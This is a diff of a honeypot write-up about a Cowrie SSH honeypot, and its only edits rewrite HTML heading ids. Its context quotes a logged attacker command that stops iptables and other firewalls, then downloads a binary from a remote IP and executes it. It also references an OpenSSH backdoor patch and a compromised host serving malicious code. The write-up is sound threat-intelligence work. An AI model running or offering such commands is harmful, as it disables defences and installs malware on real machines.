@@ -30,7 +30,7 @@
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;cowrie-ssh&#34;&gt;Cowrie ssh&lt;/h2&gt;
+&lt;h2 id=&#34;cowrie-ssh:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;Cowrie ssh&lt;/h2&gt;
 
 &lt;p&gt;This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:&lt;/p&gt;
 
@@ -96,7 +96,7 @@
 &lt;pre&gt;&lt;code&gt;HoneyPotTransport,110774,121.12.173.62] CMD: /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:88/China1991;chmod 755 China1991;./China1991;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;what-are-those-files&#34;&gt;What are those files?!?&lt;/h2&gt;
+&lt;h2 id=&#34;what-are-those-files:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;What are those files?!?&lt;/h2&gt;
 
 &lt;p&gt;Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:&lt;/p&gt;
 
@@ -250,7 +250,7 @@ record_logout(pid_t pid, const char *ttyname, const char *user)
 
 &lt;p&gt;All these modifications are in the &lt;a href=&#34;https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch&#34;&gt;openssh-3.6.1p2-backdoor.patch&lt;/a&gt; included in the code.&lt;/p&gt;
 
-&lt;h2 id=&#34;lets-do-threat-intelligence&#34;&gt;Lets do Threat Intelligence&lt;/h2&gt;
+&lt;h2 id=&#34;lets-do-threat-intelligence:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;Lets do Threat Intelligence&lt;/h2&gt;
 
 &lt;p&gt;So let&amp;rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).&lt;/p&gt;
 
@@ -286,7 +286,7 @@ record_logout(pid_t pid, const char *ttyname, const char *user)
 
 &lt;p&gt;The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&amp;rsquo;t use any common framework (I contacted the owner, no answer yet).&lt;/p&gt;
 
-&lt;h2 id=&#34;iocs&#34;&gt;IOCs&lt;/h2&gt;
+&lt;h2 id=&#34;iocs:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;IOCs&lt;/h2&gt;
 
 &lt;p&gt;It&amp;rsquo;s not the new super-duper fancy APT group attack, but I like how &lt;a href=&#34;https://twitter.com/malware_traffic&#34;&gt;Brad&lt;/a&gt; ends &lt;a href=&#34;http://www.malware-traffic-analysis.net/&#34;&gt;his posts&lt;/a&gt; with a summary of what to check on your system, so here is a short summary:&lt;/p&gt;
 
